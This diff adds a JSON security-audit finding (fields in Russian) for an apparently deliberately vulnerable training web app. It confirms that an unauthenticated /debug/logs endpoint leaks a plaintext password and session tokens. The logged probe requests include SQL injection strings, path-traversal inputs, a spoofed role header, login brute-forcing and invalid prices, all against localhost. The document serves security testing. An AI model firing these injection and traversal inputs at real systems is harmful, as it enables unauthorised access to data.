@@ -1,0 +1,712 @@
+{
+  "id": "T18+T19",
+  "route": "GET /debug/logs",
+  "category": "I, S, E",
+  "severity": "Критическая",
+  "verdict": "подтверждена",
+  "why": "/debug/logs без токена отдал журнал с паролем 'learn-alice' в теле /login и токеном сессии из заголовка X-Token в открытом виде",
+  "records": [
+    {
+      "request": {
+        "method": "POST",
+        "path": "/login",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "alice",
+          "password": "learn-alice"
+        }
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.14.4",
+          "Date": "Fri, 30 Oct 2026 21:37:43 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "45"
+        },
+        "body": "{\"token\": \"ada75d9c3ac34723858867bdbacc9c06\"}",
+        "json": {
+          "token": "ada75d9c3ac34723858867bdbacc9c06"
+        }
+      }
+    },
+    {
+      "request": {
+        "method": "GET",
+        "path": "/orders",
+        "headers": {
+          "X-Token": "ada75d9c3ac34723858867bdbacc9c06"
+        },
+        "body": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.14.4",
+          "Date": "Fri, 30 Oct 2026 21:37:43 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "356"
+        },
+        "body": "[{\"id\": 1, \"owner\": 1, \"product\": \"chair\", \"price\": 5000.0}, {\"id\": 2, \"owner\": 2, \"product\": \"lamp\", \"price\": 1500.0}, {\"id\": 3, \"owner\": 1, \"product\": \"chair\", \"price\": 1.0}, {\"id\": 4, \"owner\": 1, \"product\": \"chair\", \"price\": -5000.0}, {\"id\": 5, \"owner\": 1, \"product\": \"chair\", \"price\": \"free\"}, {\"id\": 6, \"owner\": 1, \"product\": \"lamp\", \"price\": 1500.0}]",
+        "json": [
+          {
+            "id": 1,
+            "owner": 1,
+            "product": "chair",
+            "price": 5000.0
+          },
+          {
+            "id": 2,
+            "owner": 2,
+            "product": "lamp",
+            "price": 1500.0
+          },
+          {
+            "id": 3,
+            "owner": 1,
+            "product": "chair",
+            "price": 1.0
+          },
+          {
+            "id": 4,
+            "owner": 1,
+            "product": "chair",
+            "price": -5000.0
+          },
+          {
+            "id": 5,
+            "owner": 1,
+            "product": "chair",
+            "price": "free"
+          },
+          {
+            "id": 6,
+            "owner": 1,
+            "product": "lamp",
+            "price": 1500.0
+          }
+        ]
+      }
+    },
+    {
+      "request": {
+        "method": "GET",
+        "path": "/debug/logs",
+        "headers": {},
+        "body": null
+      },
+      "response": {
+        "status": 200,
+        "headers": {
+          "Server": "BaseHTTP/0.6 Python/3.14.4",
+          "Date": "Fri, 30 Oct 2026 21:37:43 GMT",
+          "Content-Type": "application/json; charset=utf-8",
+          "Content-Length": "9818"
+        },
+        "body": "[{\"method\": \"GET\", \"target\": \"/health\", \"body\": {}, \"headers\": {\"Accept-Encoding\": \"identity\", \"Host\": \"127.0.0.1:8066\", \"User-Agent\": \"Python-urllib/3.14\", \"Connection\": \"close\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-0\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"44\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-1\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"44\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-2\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"44\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-3\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"44\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-4\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"44\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-5\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"44\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-6\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"44\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-7\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"44\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-8\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"44\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-9\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"44\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-10\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"45\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-11\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"45\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-12\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"45\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-13\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"45\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-14\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"45\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-15\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"45\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-16\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"45\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-17\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"45\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-18\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"45\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"wrong-19\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"45\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"learn-alice\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"48\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"learn-alice\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"48\", \"Content-Type\": \"application/json\"}}, {\"method\": \"GET\", \"target\": \"/orders\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"X-Token\": \"02115c10de9141e38a3b832fc264a270\"}}, {\"method\": \"POST\", \"target\": \"/logout\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"2\", \"X-Token\": \"02115c10de9141e38a3b832fc264a270\", \"Content-Type\": \"application/json\"}}, {\"method\": \"GET\", \"target\": \"/orders\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"X-Token\": \"02115c10de9141e38a3b832fc264a270\"}}, {\"method\": \"GET\", \"target\": \"/profile?id=2\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/profile?id=1%20OR%201=1\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/profile?id=0%20UNION%20SELECT%20id%2Cproduct%2Cprice%2Cowner%20FROM%20orders\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/search?q=%27%20UNION%20SELECT%20id%2Cproduct%2Cprice%2Cowner%20FROM%20orders%20--\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/search?q=\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/orders\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"learn-alice\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"48\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/orders\", \"body\": {\"product\": \"chair\", \"price\": 1}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"32\", \"X-Token\": \"9f7ce5ffe46a487bb82b500cc3272d34\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/orders\", \"body\": {\"product\": \"chair\", \"price\": -5000}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"36\", \"X-Token\": \"9f7ce5ffe46a487bb82b500cc3272d34\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/orders\", \"body\": {\"product\": \"chair\", \"price\": \"free\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"37\", \"X-Token\": \"9f7ce5ffe46a487bb82b500cc3272d34\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"learn-alice\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"48\", \"Content-Type\": \"application/json\"}}, {\"method\": \"POST\", \"target\": \"/orders\", \"body\": {\"product\": \"lamp\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"19\", \"X-Token\": \"f7b224b106724b129cab3cb5c04cdbf3\", \"Content-Type\": \"application/json\"}}, {\"method\": \"GET\", \"target\": \"/admin/export\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"X-Role\": \"staff\"}}, {\"method\": \"GET\", \"target\": \"/files?user=bob&path=receipt.txt\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/files?user=..&path=private/operator-note.txt\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/files?user=alice&path=../../private/operator-note.txt\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/files?user=../private&path=operator-note.txt\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/files?user=alice&path=.\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/files?user=alice&path=missing.txt\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"GET\", \"target\": \"/profile?id=1%3BDROP\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}, {\"method\": \"POST\", \"target\": \"/login\", \"body\": {\"username\": \"alice\", \"password\": \"learn-alice\"}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"Content-Length\": \"48\", \"Content-Type\": \"application/json\"}}, {\"method\": \"GET\", \"target\": \"/orders\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\", \"X-Token\": \"ada75d9c3ac34723858867bdbacc9c06\"}}, {\"method\": \"GET\", \"target\": \"/debug/logs\", \"body\": {}, \"headers\": {\"Host\": \"127.0.0.1:8066\", \"Accept-Encoding\": \"identity\"}}]",
+        "json": [
+          {
+            "method": "GET",
+            "target": "/health",
+            "body": {},
+            "headers": {
+              "Accept-Encoding": "identity",
+              "Host": "127.0.0.1:8066",
+              "User-Agent": "Python-urllib/3.14",
+              "Connection": "close"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-0"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "44",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-1"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "44",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-2"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "44",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-3"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "44",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-4"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "44",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-5"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "44",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-6"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "44",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-7"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "44",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-8"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "44",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-9"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "44",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-10"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "45",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-11"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "45",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-12"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "45",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-13"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "45",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-14"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "45",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-15"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "45",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-16"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "45",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-17"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "45",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-18"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "45",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "wrong-19"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "45",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "learn-alice"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "48",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "learn-alice"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "48",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/orders",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "X-Token": "02115c10de9141e38a3b832fc264a270"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/logout",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "2",
+              "X-Token": "02115c10de9141e38a3b832fc264a270",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/orders",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "X-Token": "02115c10de9141e38a3b832fc264a270"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/profile?id=2",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/profile?id=1%20OR%201=1",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/profile?id=0%20UNION%20SELECT%20id%2Cproduct%2Cprice%2Cowner%20FROM%20orders",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/search?q=%27%20UNION%20SELECT%20id%2Cproduct%2Cprice%2Cowner%20FROM%20orders%20--",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/search?q=",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/orders",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "learn-alice"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "48",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/orders",
+            "body": {
+              "product": "chair",
+              "price": 1
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "32",
+              "X-Token": "9f7ce5ffe46a487bb82b500cc3272d34",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/orders",
+            "body": {
+              "product": "chair",
+              "price": -5000
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "36",
+              "X-Token": "9f7ce5ffe46a487bb82b500cc3272d34",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/orders",
+            "body": {
+              "product": "chair",
+              "price": "free"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "37",
+              "X-Token": "9f7ce5ffe46a487bb82b500cc3272d34",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "learn-alice"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "48",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/orders",
+            "body": {
+              "product": "lamp"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "19",
+              "X-Token": "f7b224b106724b129cab3cb5c04cdbf3",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/admin/export",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "X-Role": "staff"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/files?user=bob&path=receipt.txt",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/files?user=..&path=private/operator-note.txt",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/files?user=alice&path=../../private/operator-note.txt",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/files?user=../private&path=operator-note.txt",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/files?user=alice&path=.",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/files?user=alice&path=missing.txt",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/profile?id=1%3BDROP",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          },
+          {
+            "method": "POST",
+            "target": "/login",
+            "body": {
+              "username": "alice",
+              "password": "learn-alice"
+            },
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "Content-Length": "48",
+              "Content-Type": "application/json"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/orders",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity",
+              "X-Token": "ada75d9c3ac34723858867bdbacc9c06"
+            }
+          },
+          {
+            "method": "GET",
+            "target": "/debug/logs",
+            "body": {},
+            "headers": {
+              "Host": "127.0.0.1:8066",
+              "Accept-Encoding": "identity"
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
